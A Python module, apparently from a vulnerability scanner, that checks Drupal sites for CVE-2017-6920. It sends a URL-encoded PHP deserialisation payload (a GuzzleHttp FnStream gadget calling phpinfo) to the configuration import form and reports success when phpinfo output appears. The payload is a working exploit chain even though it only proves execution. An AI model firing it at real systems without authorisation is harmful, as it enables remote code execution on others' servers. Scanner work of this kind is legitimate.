#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
# from lib.tool import check

cve_2017_6920_payloads = [
    {
        'path': 'admin/config/development/configuration/single/import',
        'data': 'config_type=system.simple&config_name={CONFIGNAME}&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={TOKEN}&form_id=config_single_import_form&op=Import'
    },
    {
        'path': 'config/development/configuration/single/import',
        'data': 'config_type=system.simple&config_name={CONFIGNAME}&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={TOKEN}&form_id=config_single_import_form&op=Import'
    },
    {
        'path': 'development/configuration/single/import',
        'data': 'config_type=system.simple&config_name={CONFIGNAME}&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={TOKEN}&form_id=config_single_import_form&op=Import'
    },
    {
        'path': 'configuration/single/import',
        'data': 'config_type=system.simple&config_name={CONFIGNAME}&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={TOKEN}&form_id=config_single_import_form&op=Import'
    },
    {
        'path': 'single/import',
        'data': 'config_type=system.simple&config_name={CONFIGNAME}&import=%21php%2Fobject+%22O%3A24%3A%5C%22GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C%22%3A2%3A%7Bs%3A33%3A%5C%22%5C0GuzzleHttp%5C%5CPsr7%5C%5CFnStream%5C0methods%5C%22%3Ba%3A1%3A%7Bs%3A5%3A%5C%22close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7Ds%3A9%3A%5C%22_fn_close%5C%22%3Bs%3A7%3A%5C%22phpinfo%5C%22%3B%7D%22&custom_entity_id=&form_build_id=form-oV9l14-rh1C9ZZYxXBTrcqCX7Gg3ouuBA29sie-ghCs&form_token={TOKEN}&form_id=config_single_import_form&op=Import'
    }
]

def cve_2017_6920_scan(self, clients):
    '''  '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'unSerialize/RCE',
        'vul_id': 'CVE-2017-6920',
    }

    for payload in cve_2017_6920_payloads:
        path = payload['path']
        data = payload['data']

        form_token = self.get_form_token(client, path, vul_info)
        if (form_token):
            random_name = random_md5(6)
            data = data.format(CONFIGNAME=random_name, TOKEN=form_token)
        else:
            return None

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (('PHP Version' in res.text) and ('PHP License' in res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
